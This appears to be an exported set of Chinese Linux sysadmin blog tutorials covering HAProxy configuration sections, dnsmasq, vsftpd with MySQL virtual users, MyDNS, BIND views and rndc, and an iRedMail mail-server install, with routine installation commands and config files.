    <content type="text"><![CDATA[haproxy 配置文件结构&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;HAProxy配置文件主要由5个部分组成，但是有些部分并不是必需的，可以根据需要选择相应的部分进行配置： 1.global部分&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;设定全局参数变量，属于进程级别的配置，通常和操作系统配置有关 2.defaults部分&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;模式参数的配置部分。在此部分设置的参数值，默认会自动引用到下面的frontend。backend和listen部分中，因此，如果某些参数属于公用的配置，只需要在defaults部分添加一次即可。如果在frontend、backend和listen部分中也配置了于defaults部分一样的参数，那么defaults部分参数对应的值自动覆盖 3.frontend部分&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;此部分用于设置接收用户请求的前段虚拟节点。frontend是在haproxy1.3版本以后才引入的一个组件，同事引入的还有backend组件。通过引入这些组件，在很大程度上简化了HAProxy配置文件的复杂性。frontend可以根据ACL规则直接指定要是用的后端backend。 4.backend部分&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;此部分用于设置集群后端服务集群的配置，也就是用来添加一组真是服务器，以处理前端用户的请求。添加的真是服务器类似于LVS中的real server节点 5. listen部分&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;此部分是frontend部分和backend部分的结合体。在HAProxy 1.3版本之前，HAProxy的所有配置选项都在这个部分上设置。为了保持兼容性，HAProxy新的版本仍然保留了listen组件的配置方式。目前在HAProxy中，两种配置方式任选其一即可。]]></content>
      <tags>
        <tag>haproxy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[centos安装配置dnsmasq]]></title>
    <url>%2F2017%2F08%2F10%2FDns%E3%80%81Iredmaill%2F5.%20centos%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AEdnsmasq%2F</url>
    <content type="text"><![CDATA[centos安装配置dnsmasq&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;公司业务使用的mydns搭建dns服务器（参考mydns安装配置），使用mydns的优点是配置、更改容易，能实现自动增加记录，而缺点也是显而易见的，因为mydns使用mysql作为数据存储仓库，如果查询很频繁的话，就会影响效率，甚至导致服务中止。但这个缺点也不是不可克服，只要在前端多配置几台dns缓存服务器即可。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在centos上使用dnsmasq是不错的选择，安装简易，配置更容易。 安装 1yum install -y dnsmasq 配置 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;假如mydns服务器为 1.1.1.1 1vim /etc/dnsmasq.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;增加一行： 1resolv-file=/etc/resolv_dnsmasq.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;保存,然后编辑 /etc/resolv_dnsmasq.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;增加一行 1nameserver 1.1.1.1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;保存该文件，启动dnsmasq 1/etc/init.d/dnsmasq start]]></content>
      <tags>
        <tag>DNS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vsftp 利用mysql 验证虚拟账户]]></title>
    <url>%2F2017%2F08%2F10%2FFTP%2F4.%20vsftp%20%E5%88%A9%E7%94%A8mysql%20%E9%AA%8C%E8%AF%81%E8%99%9A%E6%8B%9F%E8%B4%A6%E6%88%B7%2F</url>
    <content type="text"><![CDATA[vsftp 利用mysql 验证虚拟账户安装vsftpd1yum install -y vsftpd &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;编辑vsftpd.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;内容如下 1234567891011121314listen=YESconnect_from_port_20=YESpasv_enable=YEStcp_wrappers=YESlocal_enable=YESchroot_local_user=yesanonymous_enable=NOguest_enable=YESguest_username=vsftpdguestuser_config_dir=/etc/vsftpd/vsftpd_user_confpam_service_name=/etc/pam.d/vsftpddirmessage_enable=YESidle_session_timeout=600check_shell=NO &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;创建一个虚拟用户映射系统用户 1useradd –s /sbin/nologin vsftpdguest 安装 mysql&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;具体步骤参考 MySQL安装 安装 pam-mysql12345wget http://cdnetworks-kr-1.dl.sourceforge.net/project/pam-mysql/pam-mysql/0.7RC1/pam_mysql-0.7RC1.tar.gztar zxvf pam_mysql-0.7RC1.tar.gzcd pam_mysql-0.7RC1./configure --with-mysql=/usr/local/mysql --with-pam=/usr --with-pam-mods-dir=/usr/libmake &amp;&amp; make install 创建vsftp 库和相关的表并授权123456&gt;create database vsftp;&gt;use vsftp ;&gt;create table users ( name char(16) binary ,passwd char(125) binary ) ;&gt;insert into users (name,passwd) values ('test001',password('123456'));&gt;insert into users (name,passwd) values ('test002',password('234567'));&gt;grant select on vsftp.users to vsftpdguest@localhost identified by 'vsftpdguest'; 创建虚拟账户的配置文件123mkdir /etc/vsftpd/vsftpd_user_conf cd /etc/vsftpd/vsftpd_user_confvim test001 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;内容如下 1234local_root=/ftp/ write_enable=YESvirtual_use_local_privs=YESchmod_enable=YES 编辑验证文件1vim /etc/pam.d/vsftpd &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;内容如下 123#%PAM-1.0auth required /usr/lib/pam_mysql.so user=vsftpdguest passwd=vsftpdguest host=localhost db=vsftp table=users usercolumn=name passwdcolumn=passwd crypt=2account required /usr/lib/pam_mysql.so user=vsftpdguest passwd=vsftpdguest host=localhost db=vsftp table=users usercolumn=name passwdcolumn=passwd crypt=2 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果不想使用mysql也可以使用文件的形式来搞虚拟账号，请参考vsftp部署和优化]]></content>
      <tags>
        <tag>FTP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mydns安装配置]]></title>
    <url>%2F2017%2F08%2F10%2FDns%E3%80%81Iredmaill%2F4.%20mydns%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[mydns安装配置&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;远程下载 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;rpm包下载 1.因为mydns依赖mysql，所以需要先安装mysql。1yum install -y mysql-server 2 安装mydns12wget http://www.lishiming.net/data//a ... ql-1.1.0-1.i386.rpmrpm -ivh mydns-mysql-1.1.0-1.i386.rpm 3.创建库和表12345mysql -uroot -e "create database mydns"mysql -uroot mydnsmysql&gt; CREATE TABLE `soa` ( `id` int(10) unsigned NOT NULL auto_increment, `origin` char(255) default NULL, `ns` char(255) default NULL, `mbox` char(255) default NULL, `serial` int(10) unsigned default '1', `refresh` int(10) unsigned default '28800', `retry` int(10) unsigned default '7200', `expire` int(10) unsigned default '604800', `minimum` int(10) unsigned default '86400', `ttl` int(10) unsigned default '86400', `xfer` char(255) default NULL, PRIMARY KEY (`id`), UNIQUE KEY `origin` (`origin`) ) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=gbk;mysql&gt; CREATE TABLE `rr` ( `id` int(10) unsigned NOT NULL auto_increment, `zone` int(10) unsigned NOT NULL, `name` char(64) default NULL, `type` enum('A','AAAA','CNAME','HINFO','MX','NAPTR','NS','PTR','RP','SRV','TXT') default NULL, `data` char(128) default NULL, `aux` int(10) unsigned NOT NULL, `ttl` int(10) unsigned NOT NULL default '600', `inter` tinyint(3) unsigned NOT NULL default '1', `intra` tinyint(3) unsigned NOT NULL default '1', PRIMARY KEY (`id`), KEY `name` (`name`), KEY `rr` (`zone`,`name`,`type`,`data`) ) ENGINE=MyISAM AUTO_INCREMENT=1437896 DEFAULT CHARSET=gbk; 4.创建第一个zone123mysql&gt; use mydnsmysql&gt; insert into soa (id, origin,ns,mbox,serial,refresh,retry,expire,minimum,ttl) values(1,'abc.com.', 'ns.abc.com.', 'root.aminglinux.com', 1, 28800, 7200, 604800, 86400, 86400);mysql&gt; insert into rr values(1, 1, 'www', 'A', '1.1.1.1', 0, 1, 1, 1, 1); 5.配置1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889mysql&gt; show create table soa\G;CREATE TABLE `soa` ( `id` int(10) unsigned NOT NULL auto_increment, `origin` char(255) default NULL, `ns` char(255) default NULL, `mbox` char(255) default NULL, `serial` int(10) unsigned default '1', `refresh` int(10) unsigned default '28800', `retry` int(10) unsigned default '7200', `expire` int(10) unsigned default '604800', `minimum` int(10) unsigned default '86400', `ttl` int(10) unsigned default '86400', `xfer` char(255) default NULL, PRIMARY KEY (`id`), UNIQUE KEY `origin` (`origin`) ) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=gbk;mysql&gt; show create table rr\G;*************************** 1. row *************************** Table: rrCREATE TABLE `rr` ( `id` int(10) unsigned NOT NULL auto_increment, `zone` int(10) unsigned NOT NULL, `name` char(64) default NULL, `type` enum('A','AAAA','CNAME','HINFO','MX','NAPTR','NS','PTR','RP','SRV','TXT') default NULL, `data` char(128) default NULL, `aux` int(10) unsigned NOT NULL, `ttl` int(10) unsigned NOT NULL default '600', `inter` tinyint(3) unsigned NOT NULL default '1', `intra` tinyint(3) unsigned NOT NULL default '1', PRIMARY KEY (`id`), KEY `name` (`name`), KEY `rr` (`zone`,`name`,`type`,`data`) ) ENGINE=MyISAM AUTO_INCREMENT=1437896 DEFAULT CHARSET=gbk;mysql&gt; select * from soa where id=3;+----+--------------+--------------+---------------------+--------+---------+-------+--------+---------+-------+------+| id | origin | ns | mbox | serial | refresh | retry | expire | minimum | ttl | xfer |+----+--------------+--------------+---------------------+--------+---------+-------+--------+---------+-------+------+| 3 | example.com. | ns.example.com. | julyclyde.gmail.com | 1 | 28800 | 7200 | 604800 | 86400 | 86400 | NULL |mysql&gt; select * from rr where id=1;+----+------+------+------+----------------+-----+-----+-------+-------+| id | zone | name | type | data | aux | ttl | inter | intra |+----+------+------+------+----------------+-----+-----+-------+-------+| 1 | 1 | www | A | 1.1.1.1 | 0 | 1 | 1 | 1 |cat /etc/mydns.conf#### /etc/mydns.conf## Wed Nov 19 10:04:14 2008## For more information, see mydns.conf(5).## # DATABASE INFORMATIONdb-host = localhost # SQL server hostnamedb-user = yourdbname # SQL server usernamedb-password = yourpassword # SQL server passworddatabase = dns # MyDNS database name # GENERAL OPTIONSuser = nobody # Run with the permissions of this usergroup = nobody # Run with the permissions of this grouplisten = * # Listen on these addresses ('*' for all)no-listen = # Do not listen on these addresses # CACHE OPTIONSzone-cache-size = 1024 # Maximum number of elements stored in the zone cachezone-cache-expire = 60 # Number of seconds after which cached zones expiresreply-cache-size = 1024 # Maximum number of elements stored in the reply cachereply-cache-expire = 30 # Number of seconds after which cached replies expire # ESOTERICAlog = /var/log/mydns.log # Facility to use for program output (LOG_*/stdout/stderr)pidfile = /var/run/mydns.pid # Path to PID filetimeout = 120 # Number of seconds after which queries time outmulticpu = 4 # Number of CPUs installed on your system - (deprecated)servers = 2 # Number of servers to runrecursive = 8.8.8.8 # Location of recursive resolverrecursive-timeout = # Number of seconds before first retryrecursive-retries = # Number of retries before abandoning recursionrecursive-algorithm = # Recursion retry algorithm one of: linear, exponential, progressiveallow-axfr = no # Should AXFR be enabled?allow-tcp = no # Should TCP be enabled?allow-update = no # Should DNS UPDATE be enabled?ignore-minimum = no # Ignore minimum TTL for zone?soa-table = soa # Name of table containing SOA recordsrr-table = rr # Name of table containing RR datause-soa-active = no # Use the soa active attribute if provideduse-rr-active = no # Use the rr active attribute if providednotify-enabled = no # Enable notify from updatesnotify-source = 0.0.0.0 # Source address for ipv4 notify messagesnotify-source6 = 0.0.0.0 # Source address for ipv6 notify messagesnotify-timeout = 60 # Number of seconds before first retrynotify-retries = 5 # Number of retries before abandoning notifynotify-algorithm = linear # Notify retry algorithm one of: linear, exponential, progressiveixfr-enabled = no # Enable IXFR functionalityixfr-gc-enabled = no # Enable IXFR GC functionalityixfr-gc-interval = 86400 # How often to run GC for IXFRixfr-gc-delay = 600 # Delay until first IXFR GC runsextended-data-support = no # Support extended data fields for large TXT recordsdbengine = MyISAM # Support different database engineswildcard-recursion = 0 # Wildcard ancestor search levelssoa-where = # Extra WHERE clause for SOA queriesrr-where = inter=1 # Extra WHERE clause for RR queries 6.启动1/etc/init.d/mydns start]]></content>
      <tags>
        <tag>DNS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DNS服务器(四)：DNS视图及bind中rndc的使用]]></title>
    <url>%2F2017%2F08%2F10%2FDns%E3%80%81Iredmaill%2F10.%20DNS%E6%9C%8D%E5%8A%A1%E5%99%A8(%E5%9B%9B)%EF%BC%9ADNS%E8%A7%86%E5%9B%BE%E5%8F%8Abind%E4%B8%ADrndc%E7%9A%84%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[DNS服务器(四)：DNS视图及bind中rndc的使用一、DNS服务器视图功能的实现&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;DNS服务器有一个高级的功能，能够实现不同的用户访问同一个域名，把域名解析成不同的IP地址，使用户能够访问离他最近的服务器上的数据，这就是DNS服务器的视图功能。使用DNS服务器的视图功能可以增加网站的响应速度。例如，当我们网站的数据同步在两台web服务器上时，一台是电信服务器，一台是网通服务器，那么我们肯定希望全国访问我们网站的用户在打开网站的时候，能够自动实现，电信用户访问电信服务器，网通用户访问网通服务器。配置这种情况的前提是，web服务器必须要有一个电信的IP地址和一个网通的IP地址。DNS服务器的这种解析功能通常也被称之为智能解析。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;DNS服务器的视图通常在配置文件中是使用view实现的。把要使用某些IP地址作单独访问的zone区域，统一放在一个命名的view段落中，并且在view中定义请求的IP地址或IP地址段，把IP地址写入match-clients选项中。如果像上面说的，区分电信和网通路线的话，那么可以使用两个acl访问控制列表写上电信或网通IP地址，定义电信网通路线，把acl名字写入view段落match-clients选项中。如下所示： 1234567891011121314151617181920212223acl telecomip&#123; tele_IP; ... &#125;;acl netcomip&#123; net_IP; ... &#125;;view telecom &#123; match-clients &#123; telecomip; &#125;; zone "ZONE_NAME" IN &#123; type master; file "ZONE_NAME.telecom"; &#125;;&#125;;view netcom &#123; match-clients &#123; netcomip; &#125;; zone "ZONE_NAME" IN &#123; type master; file "ZONE_NAME.netcom"; &#125;;&#125;;view default &#123; match-clients &#123; any; &#125;; zone "ZONE_NAME" IN &#123; type master; file "ZONE_NAME.netcom"; &#125;;&#125;; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;需要注意的是： 如果使用了视图的功能，那么配置文件中的所有zone区域都要必须写在视图里面，如，配置文件里默认要配置的三个区域，根、127.0.0.1、1.0.0.127.in-addr.arpa都要写入视图。 在acl中定义IP地址，IP地址的写法可以是单个IP地址也可以是一个IP地址段加掩码，如：192.168.0.0/24。 视图是根据配置文件从上往下匹配的，所以希望优先访问的资源记录文件，区域应该尽量写前面。 如果定义的若干个视图的IP地址不全的话，那么可以在最后定义一个默认视图，match-clients选项中的IP地址写上any，代表如果此次访问的IP地址上面没有一个能匹配到，则在此处归类。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;实例：虚拟两台IP地址不同的主机，实现DNS服务器视图功能。 本地电脑只有一个IP地址段，故使用两个IP地址分别代表两个不同的路线。首先，我们配置一个区域wubinary.com的DNS服务器，ip地址为,192.168.0.6。打开/etc/named.rfc1912.zones文件，编辑如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152acl net &#123; 192.168.0.6; &#125;;acl local &#123; 192.168.0.12; &#125;;view netcom &#123;match-clients &#123; net; &#125;;zone "." IN &#123;type hint;file "named.ca";&#125;;zone "localhost.localdomain" IN &#123;type master;file "named.localhost";allow-update &#123; none; &#125;;&#125;;zone "localhost" IN &#123;type master;file "named.localhost";allow-update &#123; none; &#125;;&#125;;zone "1.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.ip6.arpa" IN &#123;type master;file "named.loopback";allow-update &#123; none; &#125;;&#125;;zone "1.0.0.127.in-addr.arpa" IN &#123;type master;file "named.loopback";allow-update &#123; none; &#125;;&#125;;zone "0.in-addr.arpa" IN &#123;type master;file "named.empty";allow-update &#123; none; &#125;;&#125;;zone "wubinary.com" IN &#123;type master;file "wubinary.com.net";&#125;;&#125;;view localcom &#123;match-clients &#123; local; &#125;;zone "wubinary.com" IN &#123;type master;file "wubinary.com.local";&#125;;&#125;;view default &#123;match-clients &#123; any; &#125;;zone "wubinary.com" IN &#123;type master;file "wubinary.com.local";&#125;;&#125;; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明：我们分别定义两个acl，用于代表两个不同路线，IP地址为192.168.0.6的机器访问的资源记录文件是 wubinary.com.net文件，IP地址为192.168.0.12和其它的机器则访问wubinary.com.local这个文件的资源记录文件。 分别编辑这两个文件 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;编辑文件/var/named/wubinary.com.net %EF%BC%9ADNS%E8%A7%86%E5%9B%BE%E5%8F%8Abind%E4%B8%ADrndc%E7%9A%84%E4%BD%BF%E7%94%A8/01.jpeg?raw=true) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;编辑文件/var/named/wubinary.com.local %EF%BC%9ADNS%E8%A7%86%E5%9B%BE%E5%8F%8Abind%E4%B8%ADrndc%E7%9A%84%E4%BD%BF%E7%94%A8/02.jpeg?raw=true) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这里IP地址分别改了，192.168.0.6的机器请求时对应解析的IP是192.168开头的，192.168.0.12请求时对应解析的IP是172.16开头的。配置完成后，记得修改文件所属组及文件权限。 测试一下配置文件语法。 %EF%BC%9ADNS%E8%A7%86%E5%9B%BE%E5%8F%8Abind%E4%B8%ADrndc%E7%9A%84%E4%BD%BF%E7%94%A8/03.jpeg?raw=true) 好的，重新载入配置文件，在分别在两台机器上测试一下吧。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;重载配置文件： %EF%BC%9ADNS%E8%A7%86%E5%9B%BE%E5%8F%8Abind%E4%B8%ADrndc%E7%9A%84%E4%BD%BF%E7%94%A8/04.jpeg?raw=true) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;192.168.0.6的机器，也就是我们DNS所属的这台机器，结果如下： %EF%BC%9ADNS%E8%A7%86%E5%9B%BE%E5%8F%8Abind%E4%B8%ADrndc%E7%9A%84%E4%BD%BF%E7%94%A8/05.jpeg?raw=true) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;192.168.0.12的机器，结果如下： %EF%BC%9ADNS%E8%A7%86%E5%9B%BE%E5%8F%8Abind%E4%B8%ADrndc%E7%9A%84%E4%BD%BF%E7%94%A8/06.jpeg?raw=true) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;两台机器请求DNS服务器时域名解析达到了预期的效果，测试成功。 二、bind中rndc的使用&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;rndc是Remote Name Domain Controllerr的简写，它是一个远程管理bind的工具。在使用rndc管理bind前需要使用rndc生成一对密钥文件，一半保存于rndc的配置文件中，另一半保存于bind主配置文件中。rndc的配置文件为/etc/rndc.conf，在CentOS或者RHEL中，rndc的密钥保存在/etc/rndc.key文件中。rndc默认监听在953号端口，其实在bind9中rndc默认就是可以使用可，不需要配置密钥文件。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;rndc常用命令： 123456789status #查看DNS状态reload #重新加载配置文件reload zone_name #重新加载指定区域reconfig #重读配置文件并加载新增的区域querylog #关闭或开启查询日志flush #清空服务器的缓存flushname name #清空指定名称相关的缓存trace #打开debug, debug有级别的概念，每执行一次提升一次级别trace LEVEL #指定 debug 的级别, trace 0 表示关闭debug &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用rndc： 生成密钥文件 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1rndc-confgen &gt; /etc/rndc.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;或者 1rndc-confgen -r /dev/urandom &gt; /etc/rndc.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;生成的配置文件如下： %EF%BC%9ADNS%E8%A7%86%E5%9B%BE%E5%8F%8Abind%E4%B8%ADrndc%E7%9A%84%E4%BD%BF%E7%94%A8/07.jpeg?raw=true) 复制上面配置文件中下面一块被注释的区域至/etc/named.conf文件中，并把注释关闭。 %EF%BC%9ADNS%E8%A7%86%E5%9B%BE%E5%8F%8Abind%E4%B8%ADrndc%E7%9A%84%E4%BD%BF%E7%94%A8/08.jpeg?raw=true) 重新加载bind后就可以使用rndc管理bind了。 %EF%BC%9ADNS%E8%A7%86%E5%9B%BE%E5%8F%8Abind%E4%B8%ADrndc%E7%9A%84%E4%BD%BF%E7%94%A8/09.jpeg?raw=true) 使用rndc重新加载bind的配置文件。 %EF%BC%9ADNS%E8%A7%86%E5%9B%BE%E5%8F%8Abind%E4%B8%ADrndc%E7%9A%84%E4%BD%BF%E7%94%A8/10.jpeg?raw=true) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意：如果在使用rndc时，出现如上警告时，可以删除/etc/rndc.key文件，或者重命名该文件。 DNS服务器的debug功能默认是关闭的，使用rndc trace可以开启该功能，执行一次该命令 debug 级别加一级，也可以在命令后面加一个数字作为参数，指定debug级别，当数字为0时，表示关闭debug功能。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;开启debug: %EF%BC%9ADNS%E8%A7%86%E5%9B%BE%E5%8F%8Abind%E4%B8%ADrndc%E7%9A%84%E4%BD%BF%E7%94%A8/11.jpeg?raw=true) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;关闭debug: %EF%BC%9ADNS%E8%A7%86%E5%9B%BE%E5%8F%8Abind%E4%B8%ADrndc%E7%9A%84%E4%BD%BF%E7%94%A8/12.jpeg?raw=true)]]></content>
      <tags>
        <tag>DNS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DNS、iredmaill 邮件服务]]></title>
    <url>%2F2017%2F08%2F10%2FDns%E3%80%81Iredmaill%2F1.%20dns%E3%80%81iredmail%E9%82%AE%E4%BB%B6%E6%9C%8D%E5%8A%A1%2F</url>
    <content type="text"><![CDATA[DNS、iredmaill邮件服务DNS&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;全称domain name server。域名服务器，用来解析域名的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;域名标准写法：www.qq.com. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;DNS是如何实现解析域名的：客户端先查找/etc/hosts里是否有对应域名的ip，没有的话查找dns服务器（在/etc/resolv.conf下配置的），首先查找缓存，缓存没有，找.根名称服务器DNS，根名称服务器说没有，但我知道.com，又找.com顶级名称服务器，从.com找到microsoft.com。最终找到example.microsoft.com。找的过程都是找的dns服务器。 12345678910111213141516171819202122232425262728[root@linux ~]# yum install -y bind[root@linux ~]# vi /etc/named.conf //以下是用到的配置信息，其它暂且不理会options &#123; listen-on port 53 &#123; 127.0.0.1; &#125;; //监听端口53，监听53端口的ip是谁 listen-on-v6 port 53 &#123; ::1; &#125;; //ipv6 directory "/var/named"; //子配置文件所对应的目录logging &#123; channel default_debug &#123; file "data/named.run"; //日志。路径/var/named/data/named.run severity dynamic; &#125;;&#125;;zone "." IN &#123; //.就是根域 type hint; //type有三种，master主，slave从，hint根域的hint file "named.ca"; //根域对应的文件。文件在/var/named/下&#125;;[root@linux ~]# vim /var/named/named.ca //每一个域对应一个机器。[root@linux ~]# cat /var/named/named.localhost$TTL 1D //1D就是1天生存周期@ IN SOA @ rname.invalid. ( //SOA指的是解析记录。如A、CNAME等 0 ; serial //序列号 1D ; refresh //从每隔一段时间刷一次和主的数据是否有更新 1H ; retry //发现和主不通了，再过多长时间去试一下。 1W ; expire //过期时间。缓存时间，一周 3H ) ; minimum //和上面的TTL有关，上面没有定义，以此项为准 NS @ A 127.0.0.1 AAAA ::1 //ipv6 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其中第二行的@符号指的是/etc/named.rfc1912.zones中定义的zone引号里面的内容。 1234[root@linux ~]# /etc/init.d/named start[root@linux ~]# dig @127.0.0.1 localhost[root@linux ~]# dig @127.0.0.1 localhost.localdomain[root@linux ~]# dig @127.0.0.1 -x 127.0.0.1 //测试反解析 //反解析 1.正向解析12345678910111213141516171819202122232425262728[root@linux ~]# vim /etc/named.conf //在内容的最后面增加以下内容zone "123.com" IN &#123; type master; file "123.com.zone";&#125;;[root@linux ~]# named-checkconf //检测是否有错[root@linux ~]# vim /var/named/123.com.zone$TTL 1D@ IN SOA @ admin.123.com. ( 20161025 ; serial 1D ; refresh 1H ; retry 1W ; expire 3H ) ; minimum IN NS ns.123.com. IN MX 5 mail.123.com.mail IN A 192.168.1.20ns IN A 192.168.1.70 //对外服务应写公网ipwww IN A 11.11.11.11bbs IN CNAME www[root@linux ~]# named-checkzone "123.com" /var/named/123.com.zonezone 123.com/IN: loaded serial 20161025OK[root@linux ~]# vim /etc/named.confoptions &#123; listen-on port 53 &#123; 127.0.0.1;192.168.1.70; &#125;;[root@linux ~]# /etc/init.d/named restart[root@linux ~]# dig @192.168.1.70 www.123.com 2.反向解析&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;想做邮件服务器，最好加下反解析。 12345678910111213141516171819[root@linux ~]# vim /etc/named.conf //添加以下内容zone "1.168.192.in-addr.arpa" IN &#123; type master; file "1.168.192.zone";&#125;;[root@linux ~]# vim /var/named/1.168.192.zone$TTL 1D@ IN SOA @ admin.123.com. ( 20161025 ; serial 1D ; refresh 1H ; retry 1W ; expire 3H ) ; minimum IN NS ns.123.com.160 IN PTR ns.123.com.20 IN PTR mail.123.com.[root@linux ~]# named-checkconf[root@linux ~]# /etc/init.d/named restart[root@linux ~]# dig @192.168.1.70 -x 192.168.1.20 从DNS服务器12345678910111213141516171819[root@linux ~]# yum install -y bind [root@linux ~]# vim /etc/named.conf //注释//这两行将会监听服务器上所有端口options &#123;// listen-on port 53 &#123; 127.0.0.1;192.168.1.70; &#125;;// listen-on-v6 port 53 &#123; ::1; &#125;;[root@linux ~]# vim /etc/named.conf //在文件下面添加以下信息zone "123.com" IN &#123; type slave; file "slaves/123.com.zone"; masters &#123; 192.168.11.160; &#125;; //注意大括号前后面有空格。&#125;;[root@linux ~]# /etc/init.d/named start[root@linux ~]# ls /var/named/slave //有没有生成这两个文件 11.168.192.zone 123.com.zone[root@linux ~]# cat /var/named/slaves/123.com.zone //查看和主上是否一致[root@linux ~]# dig @192.168.1.20 www.123.com //检测解析[root@linux ~]# dig @192.168.1.20 -x 192.168.1.70[root@linux ~]# vim /var/named/123.com.zone //增加一个域名记录aming IN A 111.111.111.111 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;主上有更改，从上立马生效，需要在主配置文件中添加两条notify yes;also-notify { 192.168.1.20; }; 12[root@linux ~]# named-checkconf[root@linux ~]# /etc/init.d/named restart iredmailliredmail安装&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;iRedMail 是一个基于 Linux/BSD 系统的零成本、功能完备、成熟的邮件服务器解决方案。官网 iRedmail包含的套件： postfix发邮件的 dovecot收邮件的 apache网页web访问，数据存放mysql或者openldap里面。 policyd拒绝黑名单 amavisd杀毒、扫描垃圾邮件 roundcube在web页面访问邮箱收发邮件的套件。即webmail awstat分析日志 fail2ban防止暴力破解 iRedAdmin管理邮件，账户增加、删除、修改 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;需有域名和服务器，服务器配置内存不低于1G &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先修改域名的MX记录指向自定义的比如mail.lishiming.net上 ,mail.lishiming.net需A记录指向购买的公网服务器ip上。 12345678910[root@linux ~]# hostname mail.lishiming.net[root@linux ~]# vim /etc/hosts127.0.0.1 mail.lishiming.net localhost[root@linux ~]# wget https://bitbucket.org/zhb/iredmail/downloads/iRedMail-0.9.5-1.tar.bz2[root@linux ~]# cd iRedMail-0.9.0[root@linux iRedMail-0.9.0]# cd pkgs/[root@linux pkgs]# vim get_all.sh //里面的iredmail.org修改一下[root@linux pkgs]# sed -i 's/iredmail.org/106.187.51.47/g' get_all.sh //ip是日本的代理服务器[root@linux pkgs]# cd ..[root@linux iRedMail-0.9.0]# sh iRedMail.sh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;将会出来类似于图片界面，yes–Next–按tab选择Apache（按空格键选项前会出来*号说明选中）–选择MySQL–设置mysql密码–设置域（填写域名）–设置管理员的密码–Next。输入y–是否启用iptables选择n–移动my.cnf选择y。 1[root@linux iRedMail-0.9.0]# for s in httpd iredapd amavisd clamd postfix dovecot cbpolicyd spamassassin clamd.amavisd saslauthd fail2ban; do /etc/init.d/$s restart; done &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;启动以上这些服务。 iredmail使用&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;唯有dovecot启动是失败，错误提示ipv6的ip失败，这时需编辑配置文件。 1[root@linux iRedMail-0.9.0]# vim /etc/dovecot/dovecot.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;找到： 1listen = * [::] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改为： 12listen = *[root@linux iRedMail-0.9.0]# /etc/init.d/dovecot restart &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这时浏览器访问：https://mail.lishiming.net/iredadmin //提示：您的连接不是私密连接，这时点击下面的“高级”–继续访问。Add–User 增加一个邮箱用户。 